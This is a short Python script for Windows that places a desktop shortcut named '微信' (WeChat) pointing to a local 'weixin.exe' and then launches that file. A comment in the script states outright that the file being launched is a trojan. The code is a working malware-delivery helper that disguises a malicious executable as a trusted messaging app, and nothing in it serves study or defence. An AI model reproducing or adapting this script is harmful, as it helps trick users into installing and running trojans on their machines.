#!/usr/bin/python
# -*- coding: UTF-8 -*-
import os
import sys
import os.path
import win32api
import pythoncom
from win32com.shell import shell
from win32com.shell import shellcon

def createDesktopLnk(filename,lnkname):
    shortcut = pythoncom.CoCreateInstance(
        shell.CLSID_ShellLink, None,
        pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink)
    shortcut.SetPath(filename)
    if os.path.splitext(lnkname)[-1] != '.lnk':
        lnkname += ".lnk"
    # get desktop path
    desktopPath = shell.SHGetPathFromIDList(shell.SHGetSpecialFolderLocation(0,shellcon.CSIDL_DESKTOP))
    lnkname = os.path.join(desktopPath,lnkname)
    shortcut.QueryInterface(pythoncom.IID_IPersistFile).Save(lnkname,0)

if __name__ == '__main__':
    #获取当前目录
    path=pwd = os.getcwd()
    #创建快捷方式
    path=path+u'\weixin.exe'
    title=u'微信'
    type = sys.getfilesystemencoding()
    createDesktopLnk(path, title)
    #启动木马程序
    win32api.ShellExecute(0, 'open', path, '', '', 1)
    print '创建快捷方式自启动完毕'
